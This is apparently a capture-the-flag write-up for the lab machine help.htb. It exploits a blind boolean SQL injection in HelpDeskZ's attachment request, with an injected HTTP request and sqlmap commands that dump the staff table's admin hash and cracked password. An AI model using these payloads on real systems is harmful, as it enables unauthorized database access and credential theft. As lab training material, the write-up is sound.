## BACKGROUND

The injection first needs us to create a ticket and use an arbitrary attachment (anything that passes the filters works). Afterwards, we can access the attachment of a ticket with the following request:

```http 
GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 HTTP/1.1
Host: help.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://help.htb/support/?v=view_tickets&action=ticket&param[]=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: lang=english; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BHZZCW4EA5R9Rw2rwm6U1bLvqNRMYseZIAwU7usDsw9%2Fw%3D%3D; PHPSESSID=agdn53n8li557814b1hpa50c52
Connection: close
```

However if we take a look at the code that processes this request:

```php
$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);
```

The last parameter and the first parameters are simply concatenated to the query string without any sanitization, thus we can write:

```http
GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6%20or%201%3d1%20%3b%20--%20-%20 HTTP/1.1
Host: help.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://help.htb/support/?v=view_tickets&action=ticket&param[]=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: lang=english; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BHZZCW4EA5R9Rw2rwm6U1bLvqNRMYseZIAwU7usDsw9%2Fw%3D%3D; PHPSESSID=agdn53n8li557814b1hpa50c52
Connection: close
```

And we can change weather we get the file back or not. This is therefore a blind boolean sql injection (that we get the file back being interpreted as a true statement). I decided to pass this to sqlmap (since it was going to be faster than creating a code to exploit this) with the following commands:

```bash 
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request -p 'param[]' --dbs 

...

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] support
[*] sys
```

From the code of the original page i know that there should be a table that is like `staff` (it is defined install/install.php of the helpdeskz). So the following commands are:

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request -p 'param[]' -D  support -T staff --columns

+------------------------+--------------------------+
| Column                 | Type                     |
+------------------------+--------------------------+
| admin                  | int(1)                   |
| status                 | enum('Enable','Disable') |
| avatar                 | varchar(200)             |
| department             | text                     |
| email                  | varchar(255)             |
| fullname               | varchar(100)             |
| id                     | int(11)                  |
| last_login             | int(11)                  |
| login                  | int(11)                  |
| newticket_notification | smallint(1)              |
| password               | varchar(255)             |
| signature              | mediumtext               |
| timezone               | varchar(255)             |
| username               | varchar(255)             |
+------------------------+--------------------------+

┌──(kali㉿kali)-[~]
└─$ sqlmap -r request -p 'param[]' -D  support -T staff -C username,password,admin --dump

... (using the default cracking lists) ...

+---------+----------+-----------------------------------------------------+
| admin   | username | password                                            |
+---------+----------+-----------------------------------------------------+
| 1       | admin    | d318f44739dced66793b1a603028133a76ae680e (Welcome1) |
+---------+----------+-----------------------------------------------------+

```

The following step i actually had to look it up, but it turns out that the username of the machine has to be guessed (it is not too hard, but until now all machines i did did not do this). We can now log in as [[help]].